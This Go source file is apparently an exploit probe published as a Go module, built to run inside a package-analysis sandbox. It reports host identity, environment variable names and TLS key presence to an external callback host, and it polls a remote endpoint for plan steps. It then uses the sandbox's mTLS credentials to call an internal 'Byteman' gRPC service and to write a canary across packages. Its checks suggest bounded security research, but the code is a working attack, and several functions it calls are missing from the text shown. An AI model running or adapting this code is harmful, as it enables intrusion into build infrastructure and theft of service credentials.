package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var planURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string
var rpcServiceHost string
var rpcDialAddress string

// This digest is source-pinned rather than supplied by the callback plan or
// build flags.  It identifies the exact already-consumed v44 owned-B URL.
// Tests temporarily replace it only to exercise URL validation.
var pinnedReadbackURLSHA256 = "78d7361f8ebd389fc5da7ba45c0e69cde74fbc290522804942bc3cb42fe30334"

// DESCRIPTOR_PATCH_POINT: build.py must set these values only from the pinned
// Byteman FileDescriptorSet receipt above. Empty values fail closed before Download.
var descriptorDownloadPolicyField string
var descriptorDownloadPolicyValue string
var descriptorDownloadPolicyName string
var descriptorRedirectConfigField string
var descriptorRedirectPolicyField string
var descriptorRedirectPolicyValue string
var descriptorRedirectPolicyName string

const (
	protocolVersion              = 1
	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion                 = "v0.0.50-codex"
	targetRegistry               = "https://proxy.golang.org"
	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion                = "v0.0.1"
	targetCanarySHA256           = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	targetCanaryBytes            = 2512
	pinnedReadbackHost           = "auciz-64-62-226-208.run.pinggy-free.link"
	originGoneSHA256             = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
	originGoneBytes              = 36
	downloadSource               = "robert-owned-v050-cross-package-offline-canary"
	expectedUserAgent            = "go-cgo-pkgsite-probe-v050-codex"
	sosSessionMetadataKey        = "X-SOS-SessionID"
	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
	maximumResult                = 256 * 1024
	maximumBody                  = 256 * 1024
	requestTimeout               = 20 * time.Second
	bytemanGRPCTimeout           = 60 * time.Second
	bytemanHTTPTimeout           = 65 * time.Second
	resultTimeout                = 30 * time.Second
	planPollWindow               = 30 * time.Minute
	maximumPlanBody              = 4096
	maximumPlanStep              = 12
	maximumWireDepth             = 10
	maximumWireFields            = 512
	lookupRecordLimit            = 32
	originTransitionWindow       = 30 * time.Second
	postWritePollWindow          = 8 * time.Minute
	postWriteCallLimit           = 60 * time.Second
	postWritePollDelay           = 2 * time.Second
	maximumPostWritePollAttempts = 16
	maximumStreamFrames          = 128
	maximumStreamFrameBytes      = 64 * 1024
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane             string      `json:"lane"`
	CWD              string      `json:"cwd"`
	UID              int         `json:"uid"`
	GID              int         `json:"gid"`
	Hostname         string      `json:"hostname"`
	PID1             string      `json:"pid1"`
	ModuleFiles      []fileEntry `json:"module_files"`
	EnvironmentNames []string    `json:"environment_names"`
	TLSFiles         []tlsFile   `json:"tls_files"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	ID                   string            `json:"id,omitempty"`
	Method               string            `json:"method"`
	HTTPStatus           int               `json:"http_status,omitempty"`
	GRPCStatus           string            `json:"grpc_status,omitempty"`
	GRPCMessage          string            `json:"grpc_message,omitempty"`
	BodyBytes            int               `json:"body_bytes,omitempty"`
	BodySHA256           string            `json:"body_sha256,omitempty"`
	ContentType          string            `json:"content_type,omitempty"`
	Authenticated        bool              `json:"authenticated"`
	RequestPayloadBytes  int               `json:"request_payload_bytes,omitempty"`
	RequestPayloadSHA256 string            `json:"request_payload_sha256,omitempty"`
	RequestFrameBytes    int               `json:"request_frame_bytes,omitempty"`
	RequestFrameSHA256   string            `json:"request_frame_sha256,omitempty"`
	RequestWire          []wireFieldDigest `json:"request_wire,omitempty"`
	RequestWireError     string            `json:"request_wire_error,omitempty"`
	Wire                 []wireFieldDigest `json:"wire,omitempty"`
	LookupRecordMatched  bool              `json:"lookup_record_matched,omitempty"`
	LookupMatchPath      string            `json:"lookup_match_path,omitempty"`
	LookupRecordCount    int               `json:"lookup_record_count,omitempty"`
	LookupMatchCount     int               `json:"lookup_match_count,omitempty"`
	LookupRecordsSHA256  string            `json:"lookup_records_sha256,omitempty"`
	LookupMatchSHA256    string            `json:"lookup_match_sha256,omitempty"`
	RecordMatched        bool              `json:"record_matched,omitempty"`
	RecordSHA256         string            `json:"record_sha256,omitempty"`
	DigestFieldSHA256    string            `json:"digest_field_sha256,omitempty"`
	IDFieldSHA256        string            `json:"id_field_sha256,omitempty"`
	DownloadStatusCode   uint64            `json:"download_status_code,omitempty"`
	DownloadStatusSet    bool              `json:"download_status_set,omitempty"`
	PayloadBytes         int               `json:"payload_bytes,omitempty"`
	PayloadSHA256        string            `json:"payload_sha256,omitempty"`
	PayloadPath          string            `json:"payload_path,omitempty"`
	FrameCount           int               `json:"frame_count,omitempty"`
	FrameSHA256          []string          `json:"frame_sha256,omitempty"`
	HeaderCount          int               `json:"header_count,omitempty"`
	HeaderSHA256         string            `json:"header_sha256,omitempty"`
	HeaderValid          bool              `json:"header_valid"`
	HeaderStatusSet      bool              `json:"header_status_set"`
	HeaderStatusCode     uint64            `json:"header_status_code,omitempty"`
	HeaderContentType    string            `json:"header_content_type,omitempty"`
	RawHeaderCount       int               `json:"raw_header_count,omitempty"`
	EarlyClose           bool              `json:"early_close_after_exact_payload"`
	AnalysisError        string            `json:"analysis_error,omitempty"`
	Error                string            `json:"error,omitempty"`
}

type wireFieldDigest struct {
	Path     string  `json:"path"`
	WireType int     `json:"wire_type"`
	Varint   *uint64 `json:"varint,omitempty"`
	Bytes    int     `json:"bytes,omitempty"`
	SHA256   string  `json:"sha256,omitempty"`
	Text     string  `json:"text,omitempty"`
	Nested   bool    `json:"nested,omitempty"`
}

type originResult struct {
	HeadHTTPStatus int    `json:"head_http_status,omitempty"`
	HeadState      string `json:"head_state,omitempty"`
	HTTPStatus     int    `json:"http_status,omitempty"`
	BodyBytes      int    `json:"body_bytes,omitempty"`
	BodySHA256     string `json:"body_sha256,omitempty"`
	ContentType    string `json:"content_type,omitempty"`
	State          string `json:"state,omitempty"`
	Offline        bool   `json:"offline"`
	Error          string `json:"error,omitempty"`
}

type planStep struct {
	Version   int    `json:"version"`
	ID        string `json:"id"`
	Action    string `json:"action"`
	RouteMode string `json:"route_mode,omitempty"`
}

type inspectionResult struct {
	Symbols      []string `json:"symbols,omitempty"`
	DialWindow   []string `json:"dial_window,omitempty"`
	CallerWindow []string `json:"caller_window,omitempty"`
	Error        string   `json:"error,omitempty"`
}

type probeReport struct {
	Schema                  string            `json:"schema"`
	Module                  string            `json:"module"`
	Version                 string            `json:"version"`
	TargetModule            string            `json:"target_module,omitempty"`
	TargetVersion           string            `json:"target_version,omitempty"`
	DescriptorReceiptSHA256 string            `json:"descriptor_receipt_sha256"`
	StartedUTC              string            `json:"started_utc"`
	FinishedUTC             string            `json:"finished_utc"`
	Identity                identityResult    `json:"identity"`
	Metadata                metadataResult    `json:"metadata"`
	BucketPermissions       []bucketResult    `json:"bucket_permissions,omitempty"`
	CanaryURLSHA256         string            `json:"canary_url_sha256,omitempty"`
	CanaryBodySHA256        string            `json:"canary_body_sha256,omitempty"`
	Byteman                 []grpcResult      `json:"byteman,omitempty"`
	DownloadAttempted       bool              `json:"download_attempted"`
	MutationBudgetClaimed   bool              `json:"mutation_budget_claimed"`
	AmbiguousReadback       bool              `json:"ambiguous_download_readback"`
	FreshMTLSClient         bool              `json:"fresh_mtls_client"`
	Origin                  originResult      `json:"origin"`
	StreamVerified          bool              `json:"stream_verified"`
	PlanID                  string            `json:"plan_id,omitempty"`
	RouteMode               string            `json:"route_mode,omitempty"`
	Inspection              *inspectionResult `json:"inspection,omitempty"`
	Reason                  string            `json:"reason,omitempty"`
}

type mutationBudget struct {
	claimed bool
}

func (budget *mutationBudget) claim() bool {
	if budget == nil || budget.claimed {
		return false
	}
	budget.claimed = true
	return true
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func validSessionNonce(value string) bool {
	if len(value) < 48 || len(value) > 128 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func validateBoundHTTPSURL(raw, expectedPath string) (*url.URL, error) {
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
		return nil, errors.New("runtime URL was outside the fixed HTTPS callback shape")
	}
	if port := parsed.Port(); port != "" {
		value, parseErr := strconv.Atoi(port)
		if parseErr != nil || value < 1 || value > 65535 {
			return nil, errors.New("runtime callback port was invalid")
		}
	}
	return parsed, nil
}

func validateRuntimeConfiguration() error {
	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
		return errors.New("runtime session or user agent was invalid")
	}
	paths := []struct {
		raw  string
		path string
	}{
		{genericResultURL, "/v1/result/" + sessionNonce + "/generic"},
		{compilerResultURL, "/v1/result/" + sessionNonce + "/compiler"},
		{planURL, "/v1/plan/" + sessionNonce},
	}
	var origin string
	for _, item := range paths {
		parsed, err := validateBoundHTTPSURL(item.raw, item.path)
		if err != nil {
			return err
		}
		current := parsed.Scheme + "://" + parsed.Host
		if origin == "" {
			origin = current
		} else if current != origin {
			return errors.New("runtime callbacks did not share one fixed origin")
		}
	}
	if genericResultURL == compilerResultURL {
		return errors.New("runtime result endpoints were not distinct")
	}
	readback, err := url.Parse(bytemanCanaryURL)
	if err != nil || readback.Scheme != "https" || readback.Host != pinnedReadbackHost ||
		readback.User != nil || readback.Opaque != "" || readback.RawPath != "" || readback.RawQuery != "" ||
		readback.ForceQuery || readback.Fragment != "" {
		return errors.New("readback URL was outside the source-pinned HTTPS authority")
	}
	prefix := "/v1/goproxy/"
	suffix := "/" + targetModuleName + "/@v/" + targetVersion + ".zip"
	if !strings.HasPrefix(readback.Path, prefix) || !strings.HasSuffix(readback.Path, suffix) {
		return errors.New("readback URL did not name the exact owned-B module version")
	}
	readbackSession := strings.TrimSuffix(strings.TrimPrefix(readback.Path, prefix), suffix)
	if !validSessionNonce(readbackSession) || strings.Contains(readbackSession, "/") {
		return errors.New("readback URL session segment was invalid")
	}
	readbackDigest := sha256.Sum256([]byte(bytemanCanaryURL))
	if hex.EncodeToString(readbackDigest[:]) != pinnedReadbackURLSHA256 {
		return errors.New("readback URL did not match the source-pinned v44 digest")
	}
	return nil
}

func main() {
	if validateRuntimeConfiguration() != nil ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	if identity.Lane == "capslock" {
		runCapslockSession(started, cwd, identity)
		return
	}
	report := newProbeReport(started, identity)
	report.Reason = "internal checks are fixed to the verified capslock lane"
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(genericResultURL, "v050-codex-"+identity.Lane, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:                  "owned-byteman-probe/v1",
		Module:                  moduleName,
		Version:                 probeVersion,
		TargetModule:            targetModuleName,
		TargetVersion:           targetVersion,
		DescriptorReceiptSHA256: descriptorReceiptSHA256,
		StartedUTC:              started.UTC().Format(time.RFC3339Nano),
		Identity:                identity,
	}
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         id,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
			lane = "capslock"
		}
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane:     lane,
		CWD:      cwd,
		UID:      os.Geteuid(),
		GID:      os.Getegid(),
		Hostname: hostname,
		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
		})
	}
	for _, value := range os.Environ() {
		name, _, found := strings.Cut(value, "=")
		if found && name != "" {
			result.EnvironmentNames = append(result.EnvironmentNames, name)
		}
	}
	sort.Strings(result.EnvironmentNames)
	for _, path := range []string{
		"/etc/tls/server-pool/server-tls-pool.pem",
		"/etc/tls/client/tls.crt",
		"/etc/tls/client/tls.key",
	} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present = true
			item.Mode = info.Mode().String()
			item.Size = info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
	if rpcDialAddress != "" {
		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
	}
	if rpcServiceHost != "" {
		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockSession(started time.Time, cwd string, identity identityResult) {
	initial := newProbeReport(started, identity)
	fillCapslockContext(&initial)
	initial.Reason = "waiting for a bounded Byteman plan"
	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if err := submitProbeReport(compilerResultURL, "v050-codex-capslock-initial", cwd, started, initial); err != nil {
		return
	}

	deadline := time.Now().Add(planPollWindow)
	cursor := 0
	consecutiveErrors := 0
	for cursor < maximumPlanStep && time.Now().Before(deadline) {
		step, available, err := fetchPlan(cursor)
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors >= 3 {
				break
			}
			time.Sleep(2 * time.Second)
			continue
		}
		consecutiveErrors = 0
		if !available {
			time.Sleep(2 * time.Second)
			continue
		}
		stepStarted := time.Now()
		report := newProbeReport(stepStarted, identity)
		report.PlanID = step.ID
		report.RouteMode = step.RouteMode
		switch step.Action {
		case "finish":
			report.Reason = "bounded plan finished"
		case "stream-existing-v44":
			runExistingReadback(&report, step.RouteMode)
		default:
			report.Reason = "validated plan action had no implementation"
		}
		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		id := "v050-codex-step-" + strconv.Itoa(cursor)
		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
			return
		}
		cursor++
		if step.Action == "finish" {
			return
		}
	}
	finalStarted := time.Now()
	final := newProbeReport(finalStarted, identity)
	if cursor >= maximumPlanStep {
		final.Reason = "bounded plan step limit reached"
	} else if consecutiveErrors >= 3 {
		final.Reason = "bounded plan endpoint failed three times"
	} else {
		final.Reason = "bounded plan polling window expired"
	}
	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(compilerResultURL, "v050-codex-final", cwd, finalStarted, final)
}

func fetchPlan(cursor int) (planStep, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
	if err != nil {
		return planStep{}, false, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return planStep{}, false, err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return planStep{}, false, nil
	}
	if response.StatusCode != http.StatusOK {
		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
	if err != nil || len(body) > maximumPlanBody {
		return planStep{}, false, errors.New("plan response too large")
	}
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	var step planStep
	if err := decoder.Decode(&step); err != nil {
		return planStep{}, false, errors.New("plan response was invalid JSON")
	}
	if err := decoder.Decode(&struct{}{}); err != io.EOF {
		return planStep{}, false, errors.New("plan response had trailing data")
	}
	if err := validatePlanStep(step); err != nil {
		return planStep{}, false, err
	}
	return step, true, nil
}

func validatePlanStep(step planStep) error {
	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
		return errors.New("plan identity was invalid")
	}
	for _, value := range step.ID {
		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
			return errors.New("plan identity was invalid")
		}
	}
	switch step.Action {
	case "stream-existing-v44":
		if step.RouteMode != "byteman-localhost" {
			return errors.New("readback plan did not use the one fixed direct route")
		}
	case "finish":
		if step.RouteMode != "" {
			return errors.New("finish plan included route parameters")
		}
	default:
		return errors.New("plan action was not allowed")
	}
	return nil
}

func allowedRouteMode(value string) bool {
	switch value {
	case "byteman-core-localhost", "byteman-localhost", "rpc-gateway",
		"byteman-oregon-gateway", "byteman-home-oregon-gateway", "byteman-iowa-gateway":
		return true
	default:
		return false
	}
}

func fillCapslockContext(report *probeReport) {
	// v50 is intentionally narrower than the earlier discovery clients: it
	// makes no metadata-token or cloud API calls.  The only private business RPC
	// reachable from its plan is the fixed Stream readback below.
	report.Reason = "read-only Stream client; no cloud permission checks"
}

func runExistingReadback(report *probeReport, routeMode string) {
	canaryURLDigest := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryURLDigest[:])
	report.CanaryBodySHA256 = targetCanarySHA256
	if err := validateRuntimeConfiguration(); err != nil {
		report.Reason = "source-pinned owned-B readback validation failed"
		return
	}
	client, endpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		report.Reason = "fixed direct mTLS client setup failed"
		return
	}
	defer client.CloseIdleConnections()
	result := callStreamIncremental(client, endpoint)
	report.Byteman = append(report.Byteman, result)
	report.FreshMTLSClient = true
	report.StreamVerified = result.AnalysisError == "" && result.Error == "" && result.EarlyClose &&
		result.PayloadBytes == targetCanaryBytes && result.PayloadSHA256 == targetCanarySHA256
	if report.StreamVerified {
		report.Reason = "exact existing v44 owned-B payload returned by Byteman Stream"
	} else {
		report.Reason = "bounded existing-record Stream readback did not return the exact payload"
	}
}

func runBytemanProbe(report *probeReport, routeMode string, budget *mutationBudget) {
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	report.CanaryBodySHA256 = targetCanarySHA256
	if err := validateRuntimeConfiguration(); err != nil {
		report.Reason = "runtime-owned target validation failed"
		return
	}
	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
	coordinateLookupRequest := buildCoordinateLookupRequest()
	baselineURL := callLookup(rpcClient, rpcEndpoint, "baseline-url-lookup", urlLookupRequest)
	report.Byteman = append(report.Byteman, baselineURL)
	baselineCoordinate := callLookup(rpcClient, rpcEndpoint, "baseline-coordinate-lookup", coordinateLookupRequest)
	report.Byteman = append(report.Byteman, baselineCoordinate)
	if exactLookupResult(baselineURL, "", "") {
		rpcClient.CloseIdleConnections()
		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, true, false,
			baselineURL.DigestFieldSHA256, baselineURL.IDFieldSHA256)
		return
	}
	rpcClient.CloseIdleConnections()
	downloadRequest, err := buildTargetDownloadRequest(bytemanCanaryURL)
	if err != nil {
		report.Reason = cleanError(err)
		return
	}
	downloadClient, downloadEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{
			ID: "download-client-setup", Method: "client-setup", Error: cleanError(err),
		})
		report.Reason = "fresh single-Download mTLS client setup failed"
		return
	}
	if !budget.claim() {
		downloadClient.CloseIdleConnections()
		report.MutationBudgetClaimed = true
		report.Reason = "session-wide one-mutation budget was already claimed; no Download was sent"
		return
	}
	report.MutationBudgetClaimed = true
	report.DownloadAttempted = true
	download := callDownload(downloadClient, downloadEndpoint, downloadRequest)
	report.Byteman = append(report.Byteman, download)
	downloadClient.CloseIdleConnections()
	if !grpcSucceeded(download) || download.AnalysisError != "" || !download.RecordMatched ||
		download.DigestFieldSHA256 == "" || download.IDFieldSHA256 == "" {
		report.AmbiguousReadback = true
		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false, true, "", "")
		return
	}
	runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false, false, download.DigestFieldSHA256, download.IDFieldSHA256)
}

func runOfflineReadback(report *probeReport, routeMode string, urlLookupRequest, coordinateLookupRequest []byte, readbackOnly, ambiguous bool, expectedDigestSHA256, expectedIDSHA256 string) {
	// HEAD cannot claim the one-shot URL. Only after HEAD proves that Byteman
	// consumed it do we GET the fixed 410 receipt and begin read-only recovery.
	report.Origin = waitOriginOffline()
	if !report.Origin.Offline {
		if readbackOnly {
			report.Reason = "baseline URL record existed but its one-shot origin was not offline; readback stopped"
		} else if ambiguous {
			report.Reason = "Download response was ambiguous, but non-consuming origin checks found no Byteman fetch; read-only recovery stopped"
		} else {
			report.Reason = "one-shot canary origin was not offline; persistence reads were not attempted"
		}
		return
	}

	deadline := time.Now().Add(postWritePollWindow)
	matched := false
	for attempt := 0; attempt < maximumPostWritePollAttempts && time.Now().Before(deadline); attempt++ {
		freshClient, freshEndpoint, err := newMTLSClient(routeMode)
		if err != nil {
			report.Byteman = append(report.Byteman, grpcResult{
				ID: "fresh-client-setup-" + strconv.Itoa(attempt), Method: "client-setup", Error: cleanError(err),
			})
			break
		}
		report.FreshMTLSClient = true
		remaining := time.Until(deadline)
		perCall := postWriteCallLimit
		if remaining < perCall {
			perCall = remaining
		}
		if perCall < 500*time.Millisecond {
			freshClient.CloseIdleConnections()
			break
		}
		postURL := callLookupTimeout(freshClient, freshEndpoint, "post-url-lookup-"+strconv.Itoa(attempt), urlLookupRequest, perCall)
		if !exactLookupResult(postURL, expectedDigestSHA256, expectedIDSHA256) {
			freshClient.CloseIdleConnections()
			postURL.Wire = nil
			report.Byteman = append(report.Byteman, postURL)
		} else {
			remaining = time.Until(deadline)
			coordinateLimit := postWriteCallLimit
			if remaining < coordinateLimit {
				coordinateLimit = remaining
			}
			if coordinateLimit < 500*time.Millisecond {
				freshClient.CloseIdleConnections()
				report.Byteman = append(report.Byteman, postURL)
				break
			}
			postCoordinate := callLookupTimeout(freshClient, freshEndpoint, "post-coordinate-lookup-"+strconv.Itoa(attempt), coordinateLookupRequest, coordinateLimit)
			freshClient.CloseIdleConnections()
			exact := exactLookupPair(postURL, postCoordinate, expectedDigestSHA256, expectedIDSHA256)
			if !exact {
				postURL.Wire = nil
				postCoordinate.Wire = nil
			}
			report.Byteman = append(report.Byteman, postURL, postCoordinate)
			if exact {
				matched = true
				break
			}
		}
		remaining = time.Until(deadline)
		if remaining <= 0 {
			break
		}
		delay := postWritePollDelay
		if remaining < delay {
			delay = remaining
		}
		time.Sleep(delay)
	}
	if !matched {
		if ambiguous {
			report.Reason = "origin consumption proved a possible ambiguous Download, but bounded URL-first recovery found no identical exact B record pair"
		} else {
			report.Reason = "bounded fresh-client URL-first post-write poll found no identical exact B record pair"
		}
		return
	}

	streamClient, streamEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{
			ID: "stream-client-setup", Method: "client-setup", Error: cleanError(err),
		})
		report.Reason = "fresh Stream mTLS client setup failed"
		return
	}
	report.FreshMTLSClient = true
	stream := callStream(streamClient, streamEndpoint)
	streamClient.CloseIdleConnections()
	report.Byteman = append(report.Byteman, stream)
	if grpcSucceeded(stream) && stream.PayloadBytes == targetCanaryBytes &&
		stream.PayloadSHA256 == targetCanarySHA256 {
		report.StreamVerified = true
		if readbackOnly {
			report.Reason = "pre-existing URL record was verified read-only with offline fresh-client Lookup and Stream"
		} else if ambiguous {
			report.Reason = "read-only recovery proved the ambiguous Download persisted the exact offline cross-package canary"
		} else {
			report.Reason = "offline fresh-client Lookup and Stream verified the exact cross-package canary"
		}
		return
	}
	report.Reason = "Stream did not reproduce the exact offline cross-package canary"
}

func exactLookupResult(result grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
	if !grpcSucceeded(result) || result.AnalysisError != "" || result.LookupMatchCount != 1 ||
		result.LookupMatchSHA256 == "" || result.DigestFieldSHA256 == "" || result.IDFieldSHA256 == "" {
		return false
	}
	return (expectedDigestSHA256 == "" || result.DigestFieldSHA256 == expectedDigestSHA256) &&
		(expectedIDSHA256 == "" || result.IDFieldSHA256 == expectedIDSHA256)
}

func exactLookupPair(urlResult, coordinateResult grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
	return exactLookupResult(urlResult, expectedDigestSHA256, expectedIDSHA256) &&
		exactLookupResult(coordinateResult, expectedDigestSHA256, expectedIDSHA256) &&
		urlResult.LookupMatchSHA256 != "" && urlResult.LookupMatchSHA256 == coordinateResult.LookupMatchSHA256 &&
		urlResult.DigestFieldSHA256 == coordinateResult.DigestFieldSHA256 &&
		urlResult.IDFieldSHA256 == coordinateResult.IDFieldSHA256
}

func callLookup(client *http.Client, endpoint, id string, request []byte) grpcResult {
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Lookup", request)
	return finishLookup(result, body, id)
}

func callLookupTimeout(client *http.Client, endpoint, id string, request []byte, timeout time.Duration) grpcResult {
	result, body := callGRPCRawTimeout(client, endpoint, "/sos.byteman.Byteman/Lookup", request, timeout)
	return finishLookup(result, body, id)
}

func finishLookup(result grpcResult, body []byte, id string) grpcResult {
	result.ID = id
	if !grpcSucceeded(result) {
		return result
	}
	analysis, err := analyzeLookupBody(body)
	result.Wire = analysis.Wire
	result.LookupMatchPath = analysis.MatchPath
	result.LookupRecordCount = analysis.RecordCount
	result.LookupMatchCount = analysis.MatchCount
	result.LookupRecordsSHA256 = analysis.RecordsSHA256
	result.LookupMatchSHA256 = analysis.MatchSHA256
	result.RecordSHA256 = analysis.RecordSHA256
	result.DigestFieldSHA256 = analysis.DigestSHA256
	result.IDFieldSHA256 = analysis.IDSHA256
	if err != nil {
		result.AnalysisError = cleanError(err)
		return result
	}
	result.LookupRecordMatched = analysis.MatchCount == 1
	result.RecordMatched = analysis.MatchCount == 1
	return result
}

